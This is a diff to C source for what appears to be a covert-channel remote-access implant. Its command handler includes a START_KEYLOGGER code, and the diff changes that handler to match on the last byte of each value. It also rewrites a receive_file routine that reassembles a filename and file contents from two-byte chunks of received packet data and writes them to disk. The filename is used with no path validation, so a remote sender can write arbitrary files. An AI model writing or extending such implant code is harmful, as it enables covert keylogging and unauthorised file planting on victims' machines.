@@ -1,7 +1,10 @@
 #include "utils/utils.h"
 #include "protocol.h"
+
+#include <fcntl.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <unistd.h>
 
 int calculate_data_packet_count(const struct session_info * session_info) {
     return session_info->packet_counter - COMMAND_TRIGGER_THRESHOLD;
@@ -21,7 +24,9 @@ bool handle_command_codes(struct session_info * session_info, const uint16_t dat
     enum command_codes encountered_command_code = {};
     bool is_command_code = true;
 
-    switch (data) {
+    const uint8_t last_byte = data & 0xFF;
+
+    switch (last_byte) {
         case START_KEYLOGGER:
             log_message("Start Keylogger\n");
             encountered_command_code = START_KEYLOGGER;
@@ -113,20 +118,76 @@ void receive_file(struct session_info * session_info) {
     log_message("Packet counter: %d, Data Counter: %d", session_info->packet_counter, session_info->data_counter);
 
     const struct packet_data * packet_data = session_info->head;
-    for (int i = 0; i < data_packet_to_read; ++i) {
-        if (packet_data == NULL) {
-            log_message("Crash out, packet data does not exist");
-            return;
+
+    char filename[256] = {0};
+    int filename_len = 0;
+
+    while (packet_data != NULL) {
+        const uint8_t first_byte  = (packet_data->data >> 8) & 0xFF;
+        const uint8_t second_byte = (packet_data->data) & 0xFF;
+        log_message("First Byte %d", first_byte);
+        log_message("Second Byte %d", second_byte);
+
+        // First (5, 5) sentinel signals end of filename
+        if (first_byte == FILENAME && second_byte == FILENAME) {
+            packet_data = packet_data->next;
+            break;
         }
-        log_message("Data to parse %d", packet_data->data);
-        const uint8_t new = (packet_data->data >> 8);
-        const uint8_t new_t = (packet_data->data);
-        log_message("First Byte %c", new);
-        log_message("First Byte D %d", new);
-        log_message("Second Byte %c", new_t);
-        log_message("Second Byte D %d", new_t);
+
+        if (filename_len < (int)sizeof(filename) - 2) {
+            filename[filename_len++] = (char)first_byte;
+            filename[filename_len++] = (char)second_byte;
+        }
 
         packet_data = packet_data->next;
     }
 
+    if (packet_data != NULL) {
+        const uint8_t first_byte  = (packet_data->data >> 8) & 0xFF;
+        const uint8_t second_byte = (packet_data->data) & 0xFF;
+        if (first_byte == FILENAME && second_byte == FILENAME) {
+            packet_data = packet_data->next;
+        }
+    }
+
+    while (filename_len > 0 && (filename[filename_len - 1] == '\0' || filename[filename_len - 1] == ' ')) {
+        filename_len--;
+    }
+    filename[filename_len] = '\0';
+    log_message("Filename: %s", filename);
+
+    const int fd = open(filename, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (fd < 0) {
+        log_message("Failed to open file: %s", filename);
+        return;
+    }
+    FILE * file = fdopen(fd, "wb");
+    if (file == NULL) {
+        log_message("Failed to open file: %s", filename);
+        close(fd);
+        return;
+    }
+
+    while (packet_data != NULL) {
+        const uint8_t first_byte  = (packet_data->data >> 8) & 0xFF;
+        const uint8_t second_byte = (packet_data->data) & 0xFF;
+        log_message("First Byte %d", first_byte);
+        log_message("Second Byte %d", second_byte);
+
+        if (first_byte == RECEIVE_FILE || second_byte == RECEIVE_FILE) {
+            break;
+        }
+
+        if (first_byte == 0) {
+            fwrite(&second_byte, 1, 1, file);
+        } else {
+            fwrite(&first_byte,  1, 1, file);
+            fwrite(&second_byte, 1, 1, file);
+        }
+
+        packet_data = packet_data->next;
+    }
+
+    fclose(file);
+    log_message("File saved: %s", filename);
 }
